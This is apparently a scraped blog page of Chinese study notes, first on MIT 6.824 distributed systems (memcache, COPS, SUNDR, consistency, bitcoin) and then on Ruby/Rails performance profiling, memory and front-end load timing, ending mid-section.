往primary上打log，之後等return yes VALIDATE one-sided RDMA read to re-fetch object\u0026rsquo;s version and lock flag fail early T1: Rx Ly Vx Cy T2: Ry Lx Vy Cx LOCKs will both succeed VALIDATEs will both fail COMMIT BACKUP 在commit之前至少backup要有法定人數台機器有新的值 a committed write might be revealed as soon the first COMMIT-PRIMARY is sent LOCK 通知 primaries 有新值 COMMIT-BACKUP 通知 backups 有新值 不一定馬上處理，會放在log中 直到LOCKs與COMMIT-BACKUPS都完成，TC才發COMMIT-PRIMARY 2pc中COMMIT之後就是 狀態都ok了 不能回頭了 COMMIT PRIMARY 就是最後的commit 往primary上打log primary清狀態, version++, 把值寫進去 fault tolerance? 假設總是有一個backup在 spark skip\nScaling Memcache at Facebook 網站的成長旅程 一台host = web server + DB + app app吃爆cpu 多台web server + app, 一台DB DB只有一台 多台web server + app, 多台DB 做shard，如果沒有特別熱門的key就沒事 cross-shard transactions \u0026amp; queries基本不能做了 read變慢!! 多台web server + app, 多台DB for write, cache for read cache怎麼與db sync 沒有成功cache hit，DB的load直接起飛 warm-up cache miss 接下去就是DB write，但這很難解 教訓 partition 或 replicate\npartition: divide keys over mc servers good: ram花得少 (kv不用重複copy) bad: web server要一次問很多台 huge \u0026ldquo;fan-out\u0026rdquo; =\u0026gt; parallel fetch, in-cast congestion 適用: key沒有很熱門 (不用每個data center都放) replicate: divide clients over mc servers good: 比較少tcp連線 bad: 比較少key能被cache 適用: key很熱門 region (data center)\nlower RTT to users quick local reads, from local mc and DB writes 很慢，一定要到primary 多 mc clusters 在 每個 region \u0026ldquo;regional pool\u0026rdquo; shared by all clusters =\u0026gt; unpopular objects (no need for many copies) warmup is painful\nget miss =\u0026gt; 打DB =\u0026gt; 去set cache 只給第一個req設定cache的權限(lease) 其他就先等 mc tells others \u0026ldquo;try get() again in a few milliseconds\u0026rdquo; 容錯?\npool of idle mc servers, clients only use after mc server fails 網路\nget UDP set TCP 把req累積成一個packet mcrouter batches many requests into each packet consistency not more than a few seconds stale read-your-own-writes (due to delete()) cache怎麼與DB sync (delete) DB去做 writing client去做 delete會有racing\nRace 1 真正的race, 用樂觀鎖、rwlock解\nk not in cache C1 get(k), misses C1 v1 = read k from DB C2 writes k = v2 in DB C2 delete(k) C1 set(k, v1) get時會給一個lease，如果有delete就會把lease取消掉，之後看有沒有lease決定要不要吃這個set\nRace 2 與race3很像，都是因為write傳播太慢，導致source資料不對，這裡因為是cold所以只能從hot copy，所以wait hot試試看有沒有可能ok\n在warm-up時，get從warm cluster拉資料 k starts with value v1 C1 updates k to v2 in DB C1 delete(k) -- in cold cluster C2 get(k), miss -- in cold cluster C2 v1 = get(k) from warm cluster, hits C2 set(k, v1) into cold cluster cold cluster會在2秒中忽略set，去等warm收到DB資料\nRace 3 source是local db，但是我們知道才剛update，所以標上要從remote拉\nk starts with value v1 C1 is in a secondary region C1 updates k=v2 in primary DB C1 delete(k) -- local region C1 get(k), miss C1 read local DB -- sees v1, not v2! later, v2 arrives from primary DB C1做delete時把key標上\u0026quot;remote mark\u0026quot; 讓後面的人去DB拉資料\nCausal Consistency, COPS we\u0026rsquo;ve seen two solutions for geo-replication Spanner writes involve Paxos and perhaps two-phase commit Paxos quorum for write must wait for some remote sites no one site can write on its own but has read transactions, consistent, fairly fast Facebook / Memcache writes must go to the primary site\u0026rsquo;s MySQL again, non-primary sites cannot write on their own but reads are blindingly fast (1,000,000 per second per memcache server)\n情境 3 data centers data centers有各自的shard ver1: eventually consistent reads and writes just local shard\n會自己把write推到其他data center eventually consistent\nclient看到update的順序不確定 write要等夠久才看的到 例子 quorum, with overlap (Dynamo/Cassandra) local write + asynchronously push 每個put加個timestamp(version)?\nCOPS用Lamport clocks設定timestamp Tmax = highest v# seen (from self and others) T = max(Tmax + 1, wall-clock time) concurrent write時，要選哪一個write? last-writer-wins? increment a counter時會起飛 需要其他方式做merge real transactions mini-transactions (atomic) 特定的合併方式 (set union) action transform mvcc resolution of conflicting writes is a problem for eventual/causal consistency no single \u0026ldquo;serialization point\u0026rdquo; to implement atomic operations or transactions ver2: barrier 留個sync指令 直到確認每個datacenter都有夠新的key才return 需要等 (慢) 但其他work其實寫都要等 spanner等majority of replica fb\u0026rsquo;s cache等primary datacenter 不需要transaction不失為一個不錯的方案 ver3: log 每個datacenter都有一個log server write對應到一個log datacenter把log送到其他datacenter datacenter照log順序跑 log server會是bottleneck COPS: client\u0026rsquo;s context client的context會記錄下指令的順序 這就是dependency get(X)-\u0026gt;v2 context: Xv2 get(Y)-\u0026gt;v4 context: Xv2, Yv4 put(Z, -)-\u0026gt;v3 client sends Xv2, Yv4 to shard server along with new Z context: Xv2, Yv4, Zv3 (COPS optimizes this to just Zv3) shard怎麼處理? local shard 收到put(Z, -, Yv4) 設定時間: v# = 3 for Z write: Z, -, v3 傳送到其他datacenter(不等reply) remote shard 收到Z/-/v3/Yv4 會等到Yv4到了才設定Z/-/v3 causal consistency dependency來自?\nclient的一連串puts and gets 當read來自其他client資料的時候 這dependency是transitive\n可能拿到比想像中更新的資料\n不能用在transaction或是snapshot get_trans(k1,k2,\u0026hellip;)\nclient檢查dep對不對，不對就重拿不對的 只有read的mini-transaction scenerio: ACL get(ACL), then get(list)? what if someone deletes you from ACL, then adds a photo? get(list), then get(ACL)? what if someone deletes photo, then adds you to ACL? for ACL / list example: C1: get_trans(ACL, list) C1: get(ACL) -\u0026gt; v1, no deps C2: put(ACL, v2) C2: put(list, v2, deps=ACL/v2) C1: get(list) -\u0026gt; v2, deps: ACL/v2 (C1 checks dependencies against value versions) C1: get(ACL) -\u0026gt; v2 (now C1 has a causally consistent pair of get() results) Secure Untrusted Data Repository (SUNDR) integrity source code的server bad 在source code放backdoor 忽略一些fix Serious problem Paper mentions Debian server compromised in 2003. SourceForge compromised in 2011. Canonical (Ubuntu) compromised in 2019. Naive design: sign file contents. 只能保證檔案內容與作者是誰 但server可以 亂送其他版本的檔案 假裝檔案不在 Fork consistency 每個fork看到都一樣 容易找出攻擊 難以假造log SUNDR: log of operations. log: fetch or modify, user, sig. 簽名要包含所有log steps 下載log check log 做事(Construct FS state) 加上log與簽名 上傳log 包含所有log?! 超慢 簽名慢 check慢 優化 只看最後一個簽名 (前面的一定被確認過了) 只要簽自己改過的地方就好 (一堆inode =\u0026gt; i-table) Idea: signed version vectors. Version vector: user -\u0026gt; how many operations that user performed. Version structure: signed i-handle together with version vector.\nConsistency Consistency就是發生效果的亂序程度 越弱越難預期\n有兩個排序單位\noperation transaction eventual Consistency 總有一天會拿到最新的結果 沒有時間序、執行序\nCausal Consistency 某部分效果發生是有序的(有因果關係) 這也是通常concurrent programming使用的Consistency\nSequential Consistency 效果發生照執行序來，所以如果concurrent可能有超過一種排列組合\n因為一般concurrent programming沒有transaction的概念，所以從這開始就有人叫strong Consistency\nLinearizability 照執行序來、時間序 (看前面的定義) 但是transaction的執行順序不確定(也許r/w有序，但ro穿插其間)\nStrict Serializability 照執行序來、執行序、transaction的執行順序確定\n一般提到distributed system的consistemcy最多提到上面5種，因為通常討論transaction都是DB範圍\n比較完整的圖在這 可以到來源看定義\n這邊備註一下PRAM，就是FIFO Consistency(zookeeper)\nRef Consistency Consistency Models\nbitcoin 在byzantine中共識 像SUNDR 簽過的log與fork 不像SUNDR 分散式的選用fork 組成 ledger record\npub(user1) 新owner的public key hash(prev) 前一個transaction的hash sig(user2) 前owner的簽名 (其他: amount (fractional), multiple in/out, \u0026hellip;) transaction 例子\nY 擁有一枚硬幣，之前由 X 給它： T6：pub(X)，\u0026hellip; T7：pub(Y)、hash(T6)、sig(X) Y 從 Z 買了一個漢堡包並用這枚硬幣付款 Z 將公鑰發送給 Y Y 創建一個新交易並對其進行簽名 T8：pub(Z)、hash(T7)、sig(Y) Y 向 Z 發送交易記錄 Z 驗證： T8 的 sig(Y) 對應 T7 的 pub(Y) Z給Y漢堡包 block chain\n一個coin可以花兩次嗎? 可以，創兩個transaction coin其實源自於transaction，有transaction才有coin 別阿 需要一個共同依據 fork consistency 有所有交易紀錄 大家看到的都一樣的 做了就不能反悔 參與者可能會做壞事 挑最長的chain block有 hash(prevblock) set of transactions current time (wall clock timestamp) \u0026ldquo;nonce\u0026rdquo; (類似隨機資料) 誰可以產生block miner (proof-of-work, nonce要有N個0，所以要try) 怎麼交易 假設現在block在B7 payer先flood我要交易到peer miner把交易記錄起來，等B8(目前mine的block)好 每10分鐘一個block產生 把交易記錄放到B9 payee看到交易記錄就可以接受交易 能產生分支嗎? 能 在同一時間找到同樣的nonce network問題 怎麼處理 miner挑最長的append 這能hack吧 (yes) 但要能做出更長的chain 壞處 超慢 flood限制效能與攻擊點 只要有人有過半的算力就能控制整個chain user要保護好private key DAPP DAPP怎麼工作的 從remote server拉資料 DAPP處理寫回去 好處 換app很方便，因為資料不會被綁在app上 todo的項目可以在todo list, microsoft todo上通用 app有通用的資料格式 壞處 分散式很複雜 資料加密與server安全 Ref 6.824的部分中文翻譯 MIT6.824_2021_note 分布式系统概念简介及其问题的描述 Design Principles\n","permalink":"https://littlebees.github.io/2022/03/mit-6.824%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e筆記\u003c/p\u003e","title":"mit 6.824筆記"},{"content":"動機 好看的書，但我主要是看怎麼profile與gc所以有跳過一些部分\n跳過: webfont, CDN, SSL, HTTP cache, Rails Cache, Backgrounding Work\nprinciple Benford’s Law 越大的數，以它為首幾位的數出現的機率就越低。它可用於檢查各種數據是否有造假 Zipf\u0026rsquo;s law 一個單詞出現的頻率與它在頻率表里的排名成反比 只有少數的單字常常被使用 Zipf\u0026rsquo;s law是離散的分布，如果用成連續的就是Pareto\u0026rsquo;s law(80/20)\nPareto\u0026rsquo;s law 80%的財富掌握在20%的人手上 Pareto\u0026rsquo;s law告訴我們把時間花在找出那20%決定80%的部分\n所以下面的章節有很大一部分在怎麼測量，與測量什麼\nlittle law $l=\\lambda w$ $l$是幾台主機 $\\lambda$是單位時間有多少req $w$是主機的avg. response time\n這是針對長期而言的式子，主要是用來看有沒有over-scaled(太多主機了、太少主機了(主機數剛好是算出來的數字!?)) 另外，little law預設，req彼此獨立、server彼此獨立(不能互卡(IO)、卡資源(cpu或mem有限))、response不能差平均太多(95th percentile response times很重要)\n同時也是說，scale對avg. response time沒有影響，對\nthroughput有影響 減少user在queue中的等待時間有影響 如果在queue中平均等待的人數少於1，或是在queue中等待的時間太短 scale的效果就不明顯 server沒有全力工作(100%) 所以要在到達這個點之前先scale 如果avg. response time慢，更應該如此 但要注意邊際遞減 (Amdahl\u0026rsquo;s law) The Performance Workflow 有沒有metrics怪怪的 profile找兇手，在哪邊花了最多時間 做小範圍的benchmark，測時間或是花費資源 develop環境的benchmark結果會與production的有差距 例: 500ms in production vs 1000ms locally Generally a factor of 3 is acceptable profile的結果不一定準 如果把佔了50%的method拿掉，不一定讓結果變好50% 做整體的benchmark與profile，確定改的是對的 profile profile: 測code各個部位的資源占比\nprofile mode mode不同讓測出來的時間不一樣\nCPU - clock counter 數clock cycles “Amount of clock cycles” / “CPU frequency” 但現在cpu會stepping load重的時候把clock frequency調高 system-wide 改用time stamp counter去算時間 這樣其他工作也會影響到當前的profile 建議 Use CPU time when you’re interested in seeing the profile without I/O Wall time 就是看start之後扣掉end wall就是牆上的時間 影響到當前的profile 其他process使用相同的資源 Network or I/O 建議 Despite its flaws, wall time is usually the mode you’ll want to use Process time 只測量目前process花的時間 不包括forked的process 建議 process time, if available, is usually a better choice over CPU time. If you have code that spawns subprocesses, you may need to stick with CPU time (or wall time). 有的profiler把cpu time當成這裡的process time 還有測量方式，profiler都是看在stack上花的時間去算占比\nTracing 每個invoke都記錄 超準 超浪費資源 Sampling 一定時間固定去看stack的樣子，紀錄占比 要抽樣夠多次才準 因為資源占比小，所以可以放在prodution環境中看profile ruby: Ruby-Prof Ruby-Prof直接與MRI掛勾(tracing)，所以一但跑了就會比平常慢2到3倍\nrequire \u0026#39;ruby-prof\u0026#39; SORTED_ARRAY = Array.new(10_000) { rand(100_000) }.sort! array_size = SORTED_ARRAY.size RubyProf.measure_mode = RubyProf::CPU_TIME result = RubyProf.profile do 1_000_000.times { bsearch2(SORTED_ARRAY, rand(array_size)) } end printer = RubyProf::FlatPrinter.new(result) printer.print(STDOUT) %self total self wait child calls name 17.22 19.117 12.777 0.000 6.340 13182869 Fixnum#== 8.54 6.340 6.340 0.000 0.000 13182869 BasicObject#== 5.73 71.918 4.252 0.000 67.666 14182869 *Object#bsearch2 2.14 74.196 1.590 0.000 72.606 1 Integer#times 0.93 0.688 0.688 0.000 0.000 1000000 Kernel#rand 0.68 0.508 0.508 0.000 0.000 1000000 Array#count 0.00 74.196 0.000 0.000 74.196 1 Global#[No method] %self: 花在這個method的時間占比 total: 這個method與child共花了多少時間 self: 這個method花了多少時間 child: total - self calls: 被call了幾次\n從%self的下手!!\nruby: Stackprof 做sampling的profiler是rack-mini-profiler的backend\n一般不會在開發時使用，因為Ruby-Prof比較準\nrack: rack-mini-profiler 除了一般的profile還可以看\nSQL query server response time method的flamegraph memory leak(gc) 同時rack-mini-profiler本來就是設計給production用的!!\n記得，如果在profile速度時，要調到prodution mode，因為development mode會有需多方便開發的功能把速度拖慢\n裝完就可以啟動網站，之後網頁會出現一個badge裡面大概像 之後就可以問\nHow many SQL queries am I generating? 一般來說一個orm的class就只會有一條SQL 一個簡單page一般來說是1~3條SQL What’s my total request time? 一般會希望在50ms以下 What % of time am I spending in SQL? 最好使用production的DB去測 通常production的資料量遠比develop大 How long until DOMContentLoaded fires? 從收到response到出現在畫面上需要一段過程 這留到前端優化 Are any of the parts of the page taking up an extreme amount of time compared to others? 往有SQL的項目點，可以看partial render時間與SQL時間，與花在這個項目的時間(左邊) 那中間差的時間呢? 就是在code上的，詳細的需要看flamegraph\n通常遇到partial的SQL可以試著\n把整個拿掉 cache partial 善用includes一次多load一點 另外還有profile-gc、profile-memory可以看記憶體與gc的情況!! profile-gc就是GC.stat，可以看\nNew bytes allocated outside of Ruby heaps 過了10MB要特別注意 ObjectSpace delta caused by request 收到req之後多了多少物件與哪種物件 rack-mini-profiler利用profile-memory去看\nallocated memory by gem allocated memory by file allocated objects by gem memory profile 因為多了vm這一層，所以memory profile變得很麻煩 下面的工具都是基於MRI的\nObjectSpace and objspace.so ObjectSpace就是所有object的存放地，因為是與MRI深度綁定，所以不要在prodution用\n下面來看看有什麼有趣的功能\n像ObjectSpace.count_objects\nirb(main):001:0\u0026gt; ObjectSpace.count_objects =\u0026gt; {:TOTAL=\u0026gt;53802, :FREE=\u0026gt;31, :T_OBJECT=\u0026gt;3373, :T_CLASS=\u0026gt;888, :T_MODULE=\u0026gt;30, :T_FLOAT=\u0026gt;4, :T_STRING=\u0026gt;36497, :T_REGEXP=\u0026gt;164, :T_ARRAY=\u0026gt;9399, :T_HASH=\u0026gt;789, :T_STRUCT=\u0026gt;2, :T_BIGNUM=\u0026gt;2, :T_FILE=\u0026gt;7, :T_DATA=\u0026gt;1443, :T_MATCH=\u0026gt;85, :T_COMPLEX=\u0026gt;1, :T_NODE=\u0026gt;1050, :T_ICLASS=\u0026gt;37} 好懂的好懂，但還是有些怪怪的\nT_NODE: AST T_DATA: interrupter自己的東西 這裡就看我們知道的基本type就好\n利用這個與gc開關可以來寫個簡單的benchmark看一段code產生多少object\ndef allocate_count GC.disable before = ObjectSpace.count_objects yield after = ObjectSpace.count_objects after.each { |k,v| after[k] = v - before[k] } after[:T_HASH] -= 1 # probe effect - we created the before hash. after[:FREE] += 1 # same GC.enable after.reject { |k,v| v == 0 } end allocate_count { 100.times { \u0026#39;hello\u0026#39; + \u0026#39;hi\u0026#39; }} 同時也可以看現在有多少存活的object\nputs ObjectSpace.each_object.count puts ObjectSpace.each_object(Numeric).count puts ObjectSpace.each_object(Complex).count ObjectSpace.each_object(Complex) { |c| puts c 看一個type總共花的多少mem\nirb(main):057:0\u0026gt; ObjectSpace.count_objects_size { :T_OBJECT =\u0026gt; 198560, :T_CLASS =\u0026gt; 614784, :T_MODULE =\u0026gt; 66712, :T_FLOAT =\u0026gt; 160, :T_STRING =\u0026gt; 1578522, :T_REGEXP =\u0026gt; 122875, :T_ARRAY =\u0026gt; 630976, :T_HASH =\u0026gt; 165672, :T_STRUCT =\u0026gt; 160 ... 看看這個物件佔了多少mem\nirb(main):062:0\u0026gt; ObjectSpace.memsize_of(\u0026#34;The quick brown fox jumps over the lazy dog\u0026#34;) 40 # NOT ACCURATE irb(main):063:0\u0026gt; ObjectSpace.memsize_of(\u0026#34;The quick brown fox\u0026#34;) 40 irb(main):064:0\u0026gt; ObjectSpace.memsize_of([]) 40 irb(main):065:0\u0026gt;ObjectSpace.memsize_of(Array.new(10_000) { :a }) 80040 為什麼是40? ruby vm的RVALUE大小就是40bytes\n使用時機:\n各種try，以增加gc的知識 用 ObjectSpace.each_object 去check live objects 如果市面上的profiler不行了，可以hack這個來做profile GC::Profiler ruby的gc是generational garbage collector\n看object活過幾次GC來對object分類 活過一次就是old 可以看old_objects(GC.stat)找有沒有memory leak發生 如果這個值慢慢上升就是中了 Minor GCs 只挑new處理 核心思想是 通常object沒有幾個會活很久 GC.count就是從執行程式以來GC被執行的總次數，包含major與minor GC.stat就是各種參數，除了GC的還有memory本身的各種數值\n跑跑GC::profiler吧\nGC::Profiler.enable require \u0026#39;set\u0026#39; GC.start GC::Profiler.report GC::Profiler.disable GC 133 invokes. Index Invoke Time(sec) Use Size(byte) Total Size(byte) Total Object GC Time(ms) 1 1.966 801240 6315840 157896 2.33700000000003349498 invoke的值與GC.count一樣也就是，這是從執行程式以來GC被執行的總次數\n使用時機: 如果gc跑太久，GC與GC::Profiler是個很好的開始\nderailed_benchmarks 這個是看memory用量，可以追memory bloat\n像bundle exec derailed bundle:mem 會列出每個gem用多少memory\ndelayed_job: 18.9805 MiB (Also required by: delayed/railtie, delayed_job_active_record) delayed/performable_mailer: 17.8633 MiB mail: 17.8555 MiB (Also required by: TOP) mime/types: 12.9492 MiB (Also required by: /Users/nateberkopec/.gem/ruby/2.3.0/gems/rest-client\u00021.8.0/lib/restclient/request, /Users/nateberkopec/.gem/ruby/2.3.0/gems/rest-client\u00021.8.0/lib/restclient/payload) mail/field: 2.0039 MiB mail/message: 0.8477 MiB delayed/worker: 0.6055 MiB rails/all: 15.8125 MiB rails: 7.5352 MiB (Also required by: active_record/railtie, active_model/railtie, and 10 others) rails/application: 5.3867 MiB [… continues on and on] 跑app多次，看最後花了多少mem derailed exec perf:mem_over_time 如果持續上升，memory leak\n看object到底在哪產生的 derailed exec perf:objects 可以用來追哪個指令用memory太兇\n使用時機:\nbundle:mem來check gem的mem占量，與減少mem bloat trace mem leak memory_profiler memory_profiler其實是derailed_benchmarks的backend\nmemory_profiler可以只對一段code做profile\nrequire \u0026#39;memory_profiler\u0026#39; report = MemoryProfiler.report do # run your code here end report.pretty_print 之後的report會有\nRetained memory 在跑profiler之前就在的object Allocated memory 跑profiler時alloc的object 高Allocated memory代表gc會跑比較多次，程式會變慢 另外，memory_profiler跑出來的usage與會比ps看到的少，因為ruby有memory fragmentation\nmemory_profiler也可以profile c extendsion的memory\n使用時機\n要追non-Rack-app與background jobs的mem issue Rack的app可以用 derailed and rack-mini-profiler front-end: chrome timeline 對於end-user而言，Server response times(100ms~300ms)不是重點，因為占比很小(10%) 整個load time大概是1~3秒\ngzipped size對於花多久時間下載很重要\nunzip 後的size對花多久時間parse與construct很重要\nNew Relic的real user monitoring (RUM)可以提供大概end-user感覺的page load time\nChrome Timeline可以看到每一步的實際狀況\nChrome Timeline同時會記錄其他extensions的事件!! (記得關其他extendsion) 整個流程 (從browser的角度)\nDNS/TCP/SSL setup download html parsing html. 一但遇到其他資源就停下parse等載好跑完才會繼續parse css不會擋parse js上async或是defer不會擋parse 剛剛提到不會被擋的東西，preloader會在他簡單掃過後去preload!! 所以我們要\nDon’t stop the parser. preloader會在parser跑之前先掃看有沒有可以先下載的東西 head, script, \u0026hellip; 如果用js做動態生dom(script)，這樣preloader看不到!! Get out of the browser preloader’s way. preloader不吃 iframe webfont HTML5 audio/video css @import Use HTTP caching - but not too much. 把常用的設成cache，自己打包(jquery\u0026hellip;) 如果賭user有大廠的api(來自google的cdn之類) 有，沒事 沒有，整個parse被block!! Use the Resource Hint API. DNS Prefetch Preconnect Prefetch Prerender 整個流程 (從網頁的角度)\n送request，等response 這不會出現在timeline上，前面的空白就是這段時間 包含 service response time (大約10ms) network latency (大約10ms~300ms，看有沒有跨境) 光速從新加坡到US都要花70ms!! Receive Response 在收到任何byte就會有這一事件 這就是下載，完成下載後會有Finish Loading 所以後面會看到很多這個event Parse HTML 把html轉成dom 下載需要的resource \u0026lt;script src=\u0026quot;/assets/application.js\u0026quot; async=\u0026quot;async\u0026quot; ... /\u0026gt; 這個有加async，所以不會block整個parse 如果沒加parse會等下載完才繼續 CSS不會block 跑裡面寫的JS (會有對應的js) async會下載完直接跑(中斷parse) defer會下載完等parse跑完再跑 Recalculate Styles parse CSS 把 DON 轉成 CSSOM 如果css還沒載完? 先用browser預設的 如果這邊花很久時間，代表css太複雜了 Layout 走訪DOM，算 visibility applicable CSSs tyles relative geometry (width) 複雜的CSS與HTML會讓這事件變久 layout thrashing(reflow) Any time you change the geometry of an element (its height, width, whatever), you trigger a layout event 一般browsers不知道哪邊要重算 因此大部分都是全部重算(reflow) 通常發生在 js在搞dom 太多張stylesheets What forces layout / reflow DomContentLoaded html與css與沒有標async的js(整個html)都跑完了 (照順序跑) 但其他資源還沒載完 都載完會trigger load 實際體驗 但現在不會有任何東西在畫面上 Paint 把CSSOM畫在畫面上!! 之後可能還有其他CSS,JS 就會再產生對應的事件\n怎麼用timeline來profile\nHard reload (ctrl-shift-r) and load the Timeline with fresh data Look at the pie graph for the entire page load Reduce Idle slow server responses asset requests Reduce Loading HTML/CSS太大了 Reduce Scripting 通常是花在下載其他的script async or defer 或是對js做profile Reduce Rendering and Painting 這與css優化有關 為什麼要整成一包? HTML, TCP and latency are the problems, not bandwidth. 與render或是執行相比，network latency其實很重\n一個inline的1MB page與有著100個external request的1MB page，一定是inline的最快，光是當下載就飽了 重點是什麼時候畫，什麼時間載入不是重點\n對於end-user而言最重要的時間\nFirst paint: 雖然說只會看到框框，但還是很重要，這與人感知速度有關 First paint of text content The load event Encoding\nhttp header meta tag 要放在第一個，不然會讓parse從頭再跑一次 browser去猜 Viewports 要放在第一個，不然之後有css會讓browser去reflow\ncss first 如果有js的head，且沒有async，這種情況下把js的head放css前面，這樣會讓css的下載被block\n3rd-party: New Relic development \u0026amp; production 環境會有差異的原因 Application settings code reloading Caching behavior Differences in data production資料量一定比較大(用includes) Network latency 大概數字 在同一個城市: 10ms 在兩個州之間: 20ms 從US東到US西: 100ms 到世界的另一邊: up to 300ms 如果是手機網路，可能要再乘4倍 JavaScript and devices 同樣的js code不同的裝置 PC mobile: 跑起來比較痛苦 System configuration and resources 同樣的container可以跑在不同硬體上 程式用不同的compiler或是compile flag編 Virtualization negatively and unpredictably impact performance when one virtualized server is hogging up the resources available New Relic: profile in production env Transactions: response Real-User Monitoring (also RUM and Browser monitoring):\n在每頁插入JS測時間 NavigationTimingAPI Events set include domContentLoaded, domfomplete, requestStart and responseEnd process time The web transaction response time graph\n預設時間是30mins，我們要看時間的越長越好，最好是一個月，new relic最長到7天，但也夠了\n純後端性能\nApp server avg response time Status \u0026lt; 100ms Fast! \u0026lt; 300ms Average \u0026gt; 300ms Slow! 如果是JSON的API server，可以把時間再減半\n後端加前端性能\nBrowser avg load time Status \u0026lt; 3 sec Fast! \u0026lt; 6 sec Average \u0026gt; 6 sec Slow! Next, I’m considering the shape of the response time graph 重點是在每個部分中，時間都花到哪裡去了\n一般來說應該花在ruby上最多 如果database, web external, or other processes比較多就是有問題 web external就是有人在等外部API request queueing代表需要更多server 這裡是看哪次request(transaction)最特別\n看最左(95th Percentiles)，去做優化 但也要記得看最右，為什麼這麼快，Are they asset requests? Redirects? Errors? Are they asset requests? Redirects? Errors?\nRequests per minute Scale \u0026lt; 10 Should only have 1 server/Heroku dyno. 10 - 1000 Average \u0026gt; 1000 High. “Just add more servers” may not work anymore. 大於1000時就要考慮怎麼處理databases或是cache stores，以及引入devops\nTransactions 如果requests-per-minute scale靠前，用most time consuming排序(80%時間花在20%的controller)\nrequests-per-minute小，用slowest average response time排序\n因為把一個100ms的response變成10ms對user體驗沒有太大影響(所以注意超過500ms的request)\ndatabase 用most time consuming看有沒有query太久\n常見病症\nLots of time in #find Pay attention to the “time consumption by caller” graph where is this query being called the most? Go check out those controllers and see where的欄位沒有index N+1 query SQL - OTHER Rails periodically issues queries 別管他們 External Services Most Ruby applications will block on network requests 一般Rails會被外部API的request給block 根據不同的timeout，可以delay載入大概200ms~500ms，如果是95th percentile還可以到20秒\n一個是用background worker去跑，把東西放到cache 或是設定Circuit Breaker，如果看到request一直timeout讓之後的request直接fail\nGC stats and Reports 不準，忘了他\nBrowser / Real user monitoring (RUM) 切成“Browser page load time”，之後看每個元件的average load time\nRequest queueing 通常最多10-20ms Web application 就是你的app，但注意到這裡的時間占比很小 Network 通常比 response + queueing 還久 這是算雙向的時間 DOM Processing 花很多時間 \u0026gt; Web application+Request queueing 算load finish到DOMContentReady 這個時候只是html parse完 後面還有其他CSS與JS 這個時候畫面還是白的 Page Rendering 算DOMContentReady到load DOMContentReady就是$(document).ready load就是所有資源都好了才會動 到load之前，browser可能會顯示一些畫面 Turbolinks \u0026amp; \u0026ldquo;HTML-over-the-wire\u0026rdquo; HTML-over-the-wire與SPA差在一個傳HTML一個傳資料\n一般來說，rails app (大約1秒)\nreturn a response in 100-300ms, spend about 200ms loading the HTML and CSSOM, a few hundred more ms renderingand painting then likely loads of JS scripting tied to the onload event. Turbolinks可以把上面的時間減少200-700ms\n代價\n不能用一般的方式寫js idempotent function 不能往ready一直掛hook 被Turbolinks拿去用了!! (load也被拿走了) 所以要用其他事件 不能與其他client side JS frameworks共存 load被拿走了 做Integration testing會很痛苦 在mobile上基本沒用 不能offline(SPA可以) 常見錯誤\n確信這個page有被Turbolinks 開console看有沒有Navigated to http://www.whatever.com/foo 有就gg 用dom append的方式改網頁 因為Turbolinks是回傳整個html，所以應該 用controller產生資料帶到erb，之後生html 不是一直用js塞 關於反應時間 0.1秒: 很快 1秒: 可以接受，也許有人會覺得慢 10秒: 人能夠忍耐的上限，需要feedback讓user知道跑到哪了 source\nbenchmark benchmark: 測code花多少時間或是花多少資源\n也許某段code的benchmark好，但是其實這段code的占比不大，那就不用特別去改 還有可能是單單benchmark快，但是對整體沒有影響甚至是拖累整體\nrequire \u0026#39;benchmark/ips\u0026#39; Benchmark.ips do |x| SORTED_ARRAY = Array.new(10_000) { rand(100_000) }.sort! array_size = SORTED_ARRAY.size # Typical mode, runs the block as many times as it can x.report(\u0026#34;bsearch1\u0026#34;) { bsearch1(SORTED_ARRAY, rand(array_size))} x.report(\u0026#34;bsearch2\u0026#34;) { bsearch2(SORTED_ARRAY, rand(array_size))} x.compare! end 整個網站\nab wrk performance之於企業 Create a Performance Culture 用$衡量效率 設定 a front-end load time DOMContentLoaded window.load start render time 設定 MART and/or M95RT Set a maximum average response time and/or a maximum 95th percentile response time for your server responses it’s important to capture what’s going on in the “long tail” as well as what’s happening to the average case. 設定 a page weight cannot exceed \u0026lt;projected user bandwidth in megabytes/second\u0026gt; / \u0026lt;load time budget in seconds\u0026gt; 設定 integration costs Add automated performance and page weight tests An acceptance test make a GET request to this page record two or three numbers Server response time User page load timings (DOMContentLoaded \u0026amp; load) benchmark \u0026ldquo;hot code\u0026rdquo; Run the performance acceptance tests separately from your unit and acceptance/integration tests. 這一定有灰色地帶 有第三方服務 Blazemeter Loader.io DB optimization 加index的好地方\nForeign keys Primary keys Polymorphic relationships updated_at 給 Russian Doll caching 當覺得sql效能怪怪的，用EXPLAIN\nMVCC會產生新資料與舊資料，通常在transaction好了之後舊資料會被清掉，但總是會有漏的\nVACUUM!!\n省空間 讓query planner更有效率 scale的時候，除了process變多，還有 process是怎麼與shared resource溝通\ndatabase Redis, memcache, and other key-value stores 這是重點的理由是 連線數量有限制!! 要記的算!!\n在test的時候，可以放鬆ACID，加快測試速度\ndb放RAMdisk 把fsync 與 synchronous commit關掉 Rails slow? log to disk useless gems Sprockets ActionMailer \u0026hellip; useless rack middleware Rack::Sendfile ActionDispatch::Cookies ActionDispatch::Session::CookieStore ActionDispatch::Flash ActionDispatch::RemoteIp ActionDispatch::ShowExceptions ActionDispatch::DebugExceptions ActionDispatch::Callbacks ActionDispatch::RequestId Rack::Runtime \u0026hellip; exception slow!! Exceptions should not be used for flow control, use throw/catch for that.\nThis reserves exceptions for true failure conditions.\ncatch(:done) do i = 0 loop do i += 1 throw :done if i \u0026gt; 100_000 end end finish_up memory bloat 要看什麼?\nResident Set Size (RSS): process用到的記憶體 (包含shared) Shared Memory Private Memory: 包含forked的child Real Memory = Shared Memory + Private Memory 怎麼看?\nps get_process_mem Oink 減少memory bloat\nBeware Big Allocations 不是說GC完所有不用的mem都會還回去 可以看成還記憶體很慢 替代方案是streaming: file.gets Gemfile Auditing 檢查gem: derailed_benchmarks jemalloc ptmalloc、tcmalloc与jemalloc对比分析 GC Parameters Memory Leaks 有不同等級\nManaged Ruby object leaks C-extension leaks Leaks in Ruby itself (the VM) | Item | Memory bloat | Memory leaks | | ———— | —— | ————— | | Allocated memory is actually required | Yes | No | | Growth | Fast and large | Slow and steady | | Levels off | Eventually | Never |\n一般來說大概2~3小時mem用量會平緩下來，最慢大概24小時 沒有就有可能leak\n怎麼重現\n調高環境的記憶體上限與設定不要把process砍掉 放著跑，看用量有沒有收斂 siege做多次測試，之後看\nRSS memory 